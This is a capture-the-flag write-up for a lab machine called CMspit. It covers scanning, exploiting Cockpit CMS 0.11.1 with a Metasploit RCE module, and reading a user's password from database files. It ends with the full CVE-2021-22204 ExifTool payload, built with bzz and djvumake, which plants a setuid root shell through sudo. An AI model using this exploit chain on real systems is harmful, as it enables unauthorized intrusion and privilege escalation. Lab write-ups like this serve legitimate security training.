# CMspit WriteUp
## Machine Ip = 10.82.160.103  
I found two open ports: 22, 80
```bash
rustscan -a 10.82.160.103
```
There was a login page but I don't have credentials but when we look at the source code, we will get the answer of two questions (Q3 and Q5) --> (/auth/check and /auth/resetpassword). I decided to make a directory scan:  
```bash
ffuf -u 'http://10.82.160.103/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -ic -fs 278,0
```
I found 'package.json' file and when I access it on browser I learned the name and version of CMS (cockpit),(0.11.1). It was very old version so I use metasploit for exploiting the vulnerability and get credentials. 
```bash
msfconsole
use exploit/multi/http/cockpit_cms_rce
set RHOST 10.82.160.103
set LHOST tun0
run
#After this, we get 4 users. It requires us to choose one of them to continue exploit and get a shell. So I decided to choose "admin".
set USER admin
```
I tried to access different files on the system and get the web flag from there: /var/www/html/cockpit/web.txt.  
----
Also I saw a user in there who has the name "stux". When I look at its files and folders, I noticed two files in there. ".dbshell" and ".mongorc.js". Yeah we can also read them because we have permissions.
I got the database flag from there. And also, I got the user stux's password. Lets access it by the help of "su" command. Yeah we got the stux's flag from there.  
The first thing is to check "sudo -l". I saw that i has a permision to use exiftool command.
```bash
sudo -l 
--> (root) NOPASSWD: /usr/local/bin/exiftool
```
----
Exiftool is used to read and modify metadata information (location, time, camera model, etc.) of files. However, some versions of it (e.g. CVE-2021-22204) contain a serious vulnerability that allows it to execute hidden commands while reading the file. In the CTF's requirements, I saw PoC file. What is it?   
A PoC (Proof of Concept) file is a sample file or code designed to prove that a specific vulnerability in cybersecurity actually exists and can be exploited.  

Since I can run sudo exiftool , I need an image file (PoC) that exiftool can read and execute the hidden command in as root.  
We will use "djvumake" utility for this. At first, I wanna check if this utility is enable on target terminal.
```bash
stux@ubuntu:~$ which djvumake
which djvumake
/usr/bin/djvumake
```
Yeahh, our work will be easier right now. Just use this commands:  
Let's create our payload to trick exiftool and became root.
```bash
echo '(metadata "\c${system('"'cp /bin/bash ./rootbash && chmod +xs ./rootbash'"')};")' > payload
```
ExifTool expects data inside a DjVu file to be "zipped" or compressed.  
The Tool: You use a tool called "bzz" to compress your text file.  
The Goal: This makes the malicious code look like normal, valid data to the computer, so ExifTool will try to "unzip" and read it.
```bash
bzz payload payload.bzz
```
Now you need to package everything into a real file that ExifTool can open.
The Process: You use djvumake to create a file named exploit.djvu.
The Secret Spot: You hide your compressed "trap" inside the Annotations section of the file. This is exactly where the ExifTool bug is located.
```bash
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
```
Yeah as you remember, we have sudo privilege to run the exiftool. Since you ran it with sudo, your command runs with the highest power (Root), successfully creating a special "Root-door" called rootbash.  
```bash
sudo /usr/local/bin/exiftool exploit.djvu
```
Now that the door is open, you just have to walk through it.  
```bash
./rootbash -p
```
BINGOO!!!! We are root right now and get the root flag.



